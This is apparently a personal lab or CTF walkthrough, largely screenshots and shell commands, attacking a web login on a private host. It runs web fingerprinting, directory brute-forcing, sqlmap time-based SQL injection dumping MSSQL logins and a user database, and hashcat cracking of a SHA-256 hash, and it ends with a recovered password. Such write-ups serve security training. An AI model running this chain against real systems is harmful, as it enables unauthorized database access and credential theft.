![[450_http image.png]]

![[450_http image 1.png]]

└─$ whatweb http://192.168.145.63:450

![[450_http image 2.png]]

└─$ sudo gobuster dir -u http://192.168.145.63:450 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -x php,html,txt,zip,git -t 20 -b 400,401,403,504,404

http://192.168.145.63:450/dev/

![[450_http image 3.png]]

![[450_http image 4.png]]

sqlmap

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch

![[450_http image 5.png]]

![[450_http image 6.png]]

master

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t -D master -T sys.sql_logins --dump --risk 3 --level 5 --batch

![[450_http image 7.png]]

![[450_http image 8.png]]

![[450_http image 9.png]]

==🟢butch====🟢データベースのダンプ==

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t -D butch --tables --dump --risk 3 --level 5 --batch

![[450_http image 10.png]]

\| 1       | butch    | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 |

└─$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267

![[450_http image 11.png]]

└─$ hashcat -m 1400 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[450_http image 12.png]]

![[450_http image 13.png]]

e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267:awesomedude

name butch

passkey awesomedude